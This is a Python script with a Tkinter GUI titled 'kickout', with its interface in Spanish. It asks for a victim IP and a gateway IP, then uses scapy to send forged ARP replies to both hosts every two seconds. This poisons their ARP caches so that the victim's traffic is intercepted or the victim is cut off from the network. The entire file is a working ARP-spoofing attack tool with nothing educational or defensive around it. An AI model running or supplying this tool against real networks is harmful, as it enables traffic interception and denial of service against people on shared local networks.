#!/usr/bin/env python3

import tkinter as tk
from tkinter import messagebox
import scapy.all as scapy
from scapy.all import ARP, Ether, sendp
import signal, sys, time
import ipaddress
import threading
from termcolor import colored
import subprocess

def exit():

	print(colored(f"\n[+] Se han enviado {log_packets} paquetes\n", 'green'))
	print(colored("\n[+] Saliendo......\n", 'red'))
	sys.exit(1)

def def_handler(sig, frame):

	print(colored(f"[+] Se han enviado {log_packets} paquetes\n", 'green'))
	print(colored("\n[+] Saliendo.......\n", 'red'))
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler) # ctrl + c
def main_interface():

	global log_packets
	log_packets = 0

	def spoof(target, router_ip):

		target = str(target)
		router_ip = str(router_ip)
		victim_mac = scapy.getmacbyip(target)
		gateway_mac = scapy.getmacbyip(router_ip)

		arp_packet = Ether(dst = victim_mac)/ARP(op=2, pdst=target, psrc=router_ip)
		arp_packet_gateway = Ether(dst=gateway_mac)/ARP(op=2, pdst=router_ip, psrc=target)

		print(colored(f"\n[+] Se ha iniciado el ataque hacia la ip {target}\n", 'green'))
		while True:
			try:
				global log_packets
				log_packets += 1
				sendp(arp_packet, verbose=False)
				sendp(arp_packet_gateway, verbose=False)
				time.sleep(2)
				if log_packets == 5:
					print(colored("[+] El ataque se esta llevando a cabo con exito", 'green'))

			except PermissionError:
				no_permission = messagebox.showinfo("Error", "No has ejecutado el script con permisos de administrador/root")




	def get_target():
		target = entry_target.get()
		ip_router = entry_gateway.get()
		validation(target, ip_router)

	def validation(target, ip_router):

		if target:
			if ip_router:
				try:
					target = ipaddress.ip_address(target)
					ip_router = ipaddress.ip_address(ip_router)
					thread = threading.Thread(target=spoof, args=(target, ip_router))
					thread.daemon = True
					thread.start()

				except ValueError:
					bad_target = messagebox.showinfo("Error", "No has introducido una ip")
			else:
				no_router_ip = messagebox.showindo("Error", "No has introducido la ip del router")
		else:
			no_target = messagebox.showinfo("Error", "No has introducido ninguna ip victima")


	root = tk.Tk()
	root.title("kickout")
	root.geometry("400x300")

	entry_label = tk.Label(root, text="Introduce la ip de la victima")
	entry_label.pack()
	entry_target = tk.Entry(root, width=30)
	entry_target.pack(pady=5)

	entry_gateway = tk.Label(root, text="Introduce la gateway")
	entry_gateway.pack()
	entry_gateway = tk.Entry(root, width=30)
	entry_gateway.pack(pady=5)

	button_spoof = tk.Button(root, text="spoof", command=get_target)
	button_exit = tk.Button(root, text="exit", command=exit)
	button_spoof.pack(pady=5)
	button_exit.pack(pady=5)

	root.mainloop()

if __name__ == '__main__':

	main_interface()
